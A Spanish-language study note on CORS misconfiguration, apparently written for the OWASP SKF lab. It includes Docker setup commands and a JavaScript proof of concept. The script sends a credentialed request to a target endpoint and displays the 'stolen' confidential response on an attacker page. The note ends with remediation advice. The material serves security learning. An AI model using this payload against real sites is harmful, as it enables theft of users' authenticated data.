- Tags : #cors

El **Intercambio de recursos de origen cruzado** (**CORS**) es un mecanismo que permite que un servidor web **restrinja** el **acceso a recursos** de **diferentes orígenes**, es decir, de diferentes dominios o protocolos. CORS se utiliza para proteger la privacidad y seguridad de los usuarios al evitar que otros sitios web accedan a información confidencial sin permiso.

Supongamos que tenemos una aplicación web en el dominio “**example.com**” que utiliza una API web en el dominio “**api.example.com**” para recuperar datos. Si la aplicación web está correctamente configurada para CORS, solo permitirá solicitudes de origen cruzado desde el dominio “**example.com**” a la API en el dominio “**api.example.com**“. Si se realiza una solicitud desde un dominio diferente, como “**attacker.com**“, la solicitud será bloqueada por el navegador web.

Sin embargo, si la aplicación web no está correctamente configurada para CORS, un atacante podría aprovecharse de esta debilidad para acceder a recursos y datos confidenciales. Por ejemplo, si la aplicación web no valida la autorización del usuario para acceder a los recursos, un atacante podría inyectar código malicioso en una página web para realizar solicitudes a la API de la aplicación en el dominio “**api.example.com**“.

El atacante podría utilizar herramientas automatizadas para probar diferentes valores de encabezados CORS y encontrar una configuración incorrecta que permita la solicitud desde otro dominio. Si el atacante tiene éxito, podría acceder a recursos y datos confidenciales que no deberían estar disponibles desde su sitio web. Por ejemplo, podría recuperar la información de inicio de sesión de los usuarios, modificar los datos de la aplicación, etc.

Para prevenir este tipo de ataque, es importante configurar adecuadamente CORS en la aplicación web y asegurarse de que solo se permitan solicitudes de origen cruzado desde dominios confiables.

**Recurso de Docker**: owasp-skf-lab:cors
```bash
docker pull blabla1337/owasp-skf-lab:cors

docker run -it -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors
```

![](../../../attachments/Pasted%20image%2020260218101123.png)
Cuando vemos que estas cabeceras están permitidas podemos probar este tipo de ataque pues se están permitiendo que cualquier dominio haga solicitudes a nuestro dominio lo ideal es tener restringido los dominios que si pueden hacer peticiones en lugar de  * (todos).

![](../../../attachments/Pasted%20image%2020260218101605.png)
Esto nos permitirá crearnos un recurso l=malicioso que nos permita volcar el contenido de el dominio objetivo a nuestro sitio

Nos montaremos un servidor con python en el cual pondremos nuestro codigo malicioso de ejemplo 
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;*/Define lo que va a ocurrrir cuando el usuario valla a mi pagina
  req.open('GET', 'http://localhost:5000/confidential', true); 
  req.withCredentials = true; */Arrastras las coquies del target
  req.send();

  function reqListener() {
    document.getElementById("stoleInfo").innerHTML = req.responseText;
  }
</script>

<br>
<center><h1>Has sido hackeado, esta es la informaci&ocute;n que te he robado:</h1></center>

<p id="stoleInfo"></p>
```


Como configurar correctamente el cors. Pues en el servidor solo debemos permitir los origenes correctos y no dejarlo abierto para todos.

Modificar el Access-Control-Alloww-Origin --- Especificar origin https://test.com
Midificar Origin --- https://test.com